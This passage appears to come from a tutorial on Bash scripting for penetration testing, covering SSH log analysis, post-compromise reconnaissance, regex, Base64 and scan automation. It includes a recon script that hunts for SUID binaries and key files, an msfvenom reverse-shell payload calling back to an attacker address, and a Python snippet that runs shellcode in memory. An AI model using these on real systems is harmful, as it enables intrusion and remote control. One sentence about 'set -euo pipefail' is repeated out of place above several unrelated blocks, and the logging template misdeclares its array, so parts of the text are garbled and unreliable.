        grep -oP 'from \K[\d.]+' | \
        sort | uniq -c | sort -rn | head -20 | \
        while read -r count ip; do
            if (( count >= threshold )); then
                printf "  [!] %-18s  %5d attempts  ← potential attacker\n" "$ip" "$count"
            else
                printf "  [-] %-18s  %5d attempts\n" "$ip" "$count"
            fi
        done

    echo ""
    echo "[Top 10 Targeted Accounts]"
    grep "Failed password" "$log" 2>/dev/null | \
        grep -oP 'for (?:invalid user )?\K\S+(?= from)' | \
        sort | uniq -c | sort -rn | head -10 | \
        while read -r count user; do
            printf "  %-20s  %5d attempts\n" "$user" "$count"
        done

    echo ""
    echo "[Successful Logins (last 20)]"
    grep "Accepted" "$log" 2>/dev/null | tail -20 | \
        awk '{
            ts=$1" "$2" "$3
            for(i=1;i<=NF;i++){
                if($i=="for") user=$(i+1)
                if($i=="from") ip=$(i+1)
                if($i=="via" || $i=="port") break
            }
            printf "  %-20s  %-18s  %s\n", ts, user, ip
        }'

    echo ""
    echo "[Attack Distribution by Hour (Top 5)]"
    grep "Failed password" "$log" 2>/dev/null | \
        awk '{print substr($3,1,2)":00"}' | \
        sort | uniq -c | sort -rn | head -5 | \
        while read -r count hour; do
            bar=$(printf '%0.s█' $(seq 1 $((count / 10 + 1))))
            printf "  %s  %5d attempts  %s\n" "$hour" "$count" "${bar:0:30}"
        done
}

# Generate report and save to file
generate_report "$LOG_FILE" "$THRESHOLD" | tee "$REPORT_FILE"
echo ""
echo "[*] Report saved: $REPORT_FILE"
```

### 2-6. System Information Gathering (Post-Compromise)

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash
# Post-exploitation internal reconnaissance script

echo "=========================================="
echo "  SYSTEM RECONNAISSANCE REPORT"
echo "=========================================="

echo ""
echo "[*] System Information"
echo "  Hostname   : $(hostname)"
echo "  OS         : $(cat /etc/os-release | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '"')"
echo "  Kernel     : $(uname -r)"
echo "  Arch       : $(uname -m)"

echo ""
echo "[*] Current User"
echo "  User  : $(whoami)"
echo "  UID   : $(id -u)"
echo "  Groups: $(id -Gn)"

echo ""
echo "[*] Sudo Privileges"
sudo -l 2>/dev/null | grep -v "^[[:space:]]*$"

echo ""
echo "[*] Active Network Connections"
ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null

echo ""
echo "[*] SetUID Files"
find / -perm -4000 -type f 2>/dev/null

echo ""
echo "[*] Writable Directories"
find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null

echo ""
echo "[*] Cron Jobs"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null

echo ""
echo "[*] Running Processes (Root)"
ps aux | grep root | grep -v grep

echo ""
echo "[*] Interesting Files"
find /home -name "*.txt" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find /var/www -name "*.php" -o -name "*.conf" 2>/dev/null | head -20
```

---

## 3. Regular Expressions (Regex) for Security

```bash
# Extract IP addresses
grep -oP '\b\d{1,3}(\.\d{1,3}){3}\b' file.txt

# Extract email addresses
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' file.txt

# Extract URLs
grep -oP 'https?://[^\s<>"]+' file.txt

# Detect Base64-encoded strings
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' file.txt

# Extract numbers only
grep -oP '\d+' file.txt

# Hex patterns (shellcode, etc.)
grep -oP '\\x[0-9a-fA-F]{2}' shellcode.txt
```

---

## 4. Process Management and Background Execution

```bash
# Run in background
long_scan.sh &
echo "PID: $!"

# List background processes
jobs

# Bring to foreground
fg %1

# Keep running after terminal closes with nohup
nohup ./scan.sh > output.log 2>&1 &

# Maintain session with screen
screen -S hacking_session
# Detach with Ctrl+A, D
screen -r hacking_session  # Reattach

# Use tmux
tmux new -s attack
# Detach with Ctrl+B, D
tmux attach -t attack
```

---

## 5. Advanced Bash Techniques

### Error Handling

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash
set -e          # Exit immediately on error
set -u          # Error on undefined variable usage
set -o pipefail  # Propagate pipeline errors

# Clean up on exit using trap
cleanup() {
    echo "[*] Cleaning up..."
    rm -f /tmp/scan_*.txt
}
trap cleanup EXIT
```

### Parallel Processing

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash
# Parallel port scan (much faster)

NETWORK="192.168.1"

scan_host() {
    local ip="$NETWORK.$1"
    ping -c 1 -W 1 "$ip" &>/dev/null && echo "$ip is ALIVE"
}

export -f scan_host
export NETWORK

# Parallel execution using xargs (up to 50 concurrent)
seq 1 254 | xargs -P 50 -I {} bash -c 'scan_host "$@"' _ {}
```

---

## 6. Base64 Encoding/Decoding (Security Analysis)

### Basic Usage
```bash
# Encode
echo -n "Hello World" | base64
# Output: SGVsbG8gV29ybGQ=

# Decode
echo "SGVsbG8gV29ybGQ=" | base64 -d
# Output: Hello World

# Encode file
base64 binary_file > encoded.txt

# Decode file
base64 -d encoded.txt > decoded_file
```

### Security Analysis Applications
```bash
# Extract and decode Base64-encoded strings from malware
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' suspicious_file.txt | \
    while read b64; do
        decoded=$(echo "$b64" | base64 -d 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo "=== Decoded ==="
            echo "$decoded"
        fi
    done

# Extract Base64 from URL (handle URL-safe variant)
echo "aHR0cDovL2V4YW1wbGUuY29t" | base64 -d
# Output: http://example.com

# Decode PowerShell malware (EncodedCommand)
# powershell -enc <Base64>
echo "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=" | \
    base64 -d | iconv -f UTF-16LE -t UTF-8

# Process Base64 with Python
python3 -c "import base64; print(base64.b64decode('SGVsbG8gV29ybGQ=').decode())"

# Detect Base64 encoding variants
# Standard: A-Z, a-z, 0-9, +, /
# URL-safe:  A-Z, a-z, 0-9, -, _
echo "SGVsbG8-V29ybGQ_" | tr '-_' '+/' | base64 -d
```

### Shellcode Base64 Encoding (For Practice)
```bash
# Encode shellcode generated by msfvenom
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f raw | base64 | tr -d '\n'

# Decode and execute (Python)
python3 -c "
import base64
sc = base64.b64decode('BASE64_SHELLCODE')
# Execute in memory (ctypes method)
import ctypes
buf = ctypes.create_string_buffer(sc)
ctypes.cast(buf, ctypes.CFUNCTYPE(None))()
"
```

---

## 7. Script Input Validation and Secure Coding

### Input Validation

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash
# Safe input validation

validate_ip() {
    local ip=$1
    local stat=1
    
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 && \
           ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}

# Validate IP address
TARGET_IP="$1"
if ! validate_ip "$TARGET_IP"; then
    echo "[!] Invalid IP address: $TARGET_IP"
    exit 1
fi

validate_port() {
    local port=$1
    [[ "$port" =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]
}
```

### Safe Temporary File Handling

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash
# Safe temporary file creation and cleanup

# Create safe temp files using mktemp
TMPFILE=$(mktemp /tmp/scan_XXXXXX.txt)
TMPDIR=$(mktemp -d /tmp/output_XXXXXX)

# Automatic cleanup on exit (including interrupts)
cleanup() {
    rm -f "$TMPFILE"
    rm -rf "$TMPDIR"
    echo "[*] Temporary files cleaned up"
}
trap cleanup EXIT INT TERM

# Perform work
nmap -sV TARGET_IP > "$TMPFILE"
cp "$TMPFILE" "$TMPDIR/nmap_result.txt"

echo "[+] Scan complete: $TMPDIR/nmap_result.txt"
```

### Script with Logging

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/usr/bin/env bash
# Pentest automation template with logging
# Usage: sudo bash pentest_template.sh <TARGET_IP> [-o output_dir]
set -euo pipefail
IFS=$'\n\t'

TARGET="${1:-}"
OUTPUT_DIR="${2:-.}"
LOG_FILE="${OUTPUT_DIR}/pentest_$(date +%Y%m%d_%H%M%S).log"
SEVERITY_COUNTS=( [DEBUG]=0 [INFO]=0 [WARN]=0 [ERROR]=0 )

# --- Logging utilities ---
log() {
    local level="$1"; shift
    local msg="$*"
    local ts; ts="$(date '+%Y-%m-%d %H:%M:%S')"
    local color=""
    case "$level" in
        DEBUG) color="\033[0;37m" ;;
        INFO)  color="\033[0;32m" ;;
        WARN)  color="\033[1;33m" ;;
        ERROR) color="\033[0;31m" ;;
    esac
    printf "${color}[%s] [%-5s] %s\033[0m\n" "$ts" "$level" "$msg" | tee -a "$LOG_FILE"
    (( SEVERITY_COUNTS[$level]++ )) || true
}

run_step() {
    local description="$1"; shift
    log INFO "Start: $description"
    if "$@" >> "$LOG_FILE" 2>&1; then
        log INFO "Done: $description"
        return 0
    else
        local exit_code=$?
        log WARN "Failed (exit $exit_code): $description"
        return $exit_code
    fi
}

cleanup() {
    log INFO "Cleaning up..."
    # Remove temp files and finalize
}
trap cleanup EXIT

# --- Input validation ---
if [[ -z "$TARGET" ]]; then
    log ERROR "Usage: $0 <TARGET_IP> [output_directory]"
    exit 1
fi

if ! [[ "$TARGET" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    log ERROR "Invalid IP address: $TARGET"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"
log INFO "=== Pentest started: $TARGET ==="

# --- Scan steps ---
run_step "Nmap quick scan (top-100 ports)" \
    nmap -sC -sV --top-ports 100 -oN "${OUTPUT_DIR}/nmap_quick.txt" "$TARGET"

run_step "Nmap full port scan" \
    nmap -sS -p- --min-rate 5000 -oN "${OUTPUT_DIR}/nmap_full.txt" "$TARGET" || true

run_step "Vulnerability script scan" \
    nmap --script vuln -oN "${OUTPUT_DIR}/nmap_vuln.txt" "$TARGET" || true

# --- Completion summary ---
log INFO "=== Scan complete ==="
log INFO "Results directory: $OUTPUT_DIR"
log INFO "Log file: $LOG_FILE"
log INFO "Warnings: ${SEVERITY_COUNTS[WARN]}  Errors: ${SEVERITY_COUNTS[ERROR]}"
```
